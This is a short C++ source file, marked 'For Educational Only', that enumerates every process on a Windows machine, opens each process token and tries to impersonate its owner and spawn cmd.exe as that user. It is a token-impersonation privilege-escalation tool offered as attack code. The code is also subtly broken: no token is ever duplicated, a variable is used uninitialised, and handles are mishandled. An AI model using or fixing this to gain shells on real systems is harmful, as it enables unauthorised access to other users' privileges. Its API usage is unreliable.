//
// Created by Sina Tamari
// For Educational Only
//
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
int check(DWORD pid){
	HANDLE rProcess2 = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	HANDLE pToken;
	BOOL tResult = OpenProcessToken(rProcess2, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_IMPERSONATE, &pToken);
	SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	HANDLE pNewToken = new HANDLE;
    DWORD tInfo;
	DWORD szInfo;
	GetTokenInformation(pNewToken, TokenSessionId, &tInfo, szInfo, &szInfo);
	BOOL bResult = ImpersonateLoggedOnUser(pNewToken);
	STARTUPINFOA si = {};
	PROCESS_INFORMATION pi = {};
	CreateProcessAsUserA(pNewToken, NULL, "C:\\Windows\\system32\\cmd.exe", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, "c:\\windows\\system32", &si, &pi);
	CloseHandle(rProcess2);
	CloseHandle(pNewToken);
	CloseHandle(pToken);
	return 0;}
int enumProc(){
	wchar_t* proc_name;
	DWORD PID = NULL;
	PROCESSENTRY32 pe;
	HANDLE h;
	pe.dwSize = sizeof(PROCESSENTRY32);
	h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Process32First(h, &pe)){
		do{
			proc_name = pe.szExeFile;
			PID = pe.th32ProcessID;
			check(PID);} 
			while (Process32Next(h, &pe));}
	return 0;}
int main(){
	enumProc();
	return 0;}
